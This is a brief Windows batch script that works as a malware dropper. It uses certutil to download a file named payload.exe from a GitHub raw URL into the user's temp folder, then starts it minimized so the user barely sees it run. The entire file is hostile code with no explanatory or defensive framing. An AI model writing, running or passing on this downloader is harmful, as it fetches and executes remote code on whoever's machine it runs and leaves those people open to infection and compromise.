@echo off
setlocal
set "url=https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/payload.exe"
set "outfile=%TEMP%\payload.exe"

certutil -urlcache -split -f "%url%" "%outfile%"
if exist "%outfile%" (
    start "" /min "%outfile%"
)
